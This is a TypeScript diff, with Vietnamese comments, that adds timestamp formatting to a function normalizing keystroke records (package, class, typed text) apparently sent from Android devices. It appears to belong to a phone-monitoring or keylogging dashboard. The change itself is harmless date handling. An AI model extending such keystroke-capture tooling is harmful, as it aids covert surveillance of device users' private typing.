@@ -428,8 +428,11 @@ export function normalizeAppList(raw: unknown[]): AppEntry[] {
 export function normalizeKeystrokeList(raw: unknown[]): KeystrokeEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
+    // Format timestamp: Android gửi epoch millis (number), backend có thể lưu dạng ISO string
+    const tsRaw = r.timestamp ?? r.ts;
+    const timestamp = formatTimestamp(tsRaw);
     return {
-      type: (r.type === 'offline' ? 'offline' : 'live') as 'live' | 'offline',
+      type: (r.type === 'offline' ? 'offline' : r.type === 'history' ? 'offline' : 'live') as 'live' | 'offline',
       eventType: String(r.eventType || ''),
       pkg: String(r.pkg || ''),
       cls: String(r.cls || ''),
@@ -437,9 +440,40 @@ export function normalizeKeystrokeList(raw: unknown[]): KeystrokeEntry[] {
       text: String(r.txt || r.text || ''),
       extra: String(r.extra || ''),
       content: String(r.content || ''),
-      timestamp: String(r.timestamp || r.ts || ''),
+      timestamp,
     };
   });
+}
+
+/** Format timestamp value (epoch millis number, ISO string, hoặc date string) thành chuỗi ngày giờ đọc được */
+function formatTimestamp(value: unknown): string {
+  if (value == null || value === '') return '';
+  // Nếu là số (epoch millis)
+  if (typeof value === 'number') {
+    try {
+      return new Date(value).toLocaleString();
+    } catch {
+      return String(value);
+    }
+  }
+  const str = String(value);
+  // Nếu là epoch millis dạng string (chỉ chứa số)
+  if (/^\d{10,13}$/.test(str)) {
+    try {
+      const ms = str.length === 10 ? Number(str) * 1000 : Number(str);
+      return new Date(ms).toLocaleString();
+    } catch {
+      return str;
+    }
+  }
+  // Nếu là ISO string hoặc date string khác
+  try {
+    const d = new Date(str);
+    if (!isNaN(d.getTime())) {
+      return d.toLocaleString();
+    }
+  } catch {}
+  return str;
 }
 
 /** Normalize raw file data from backend */
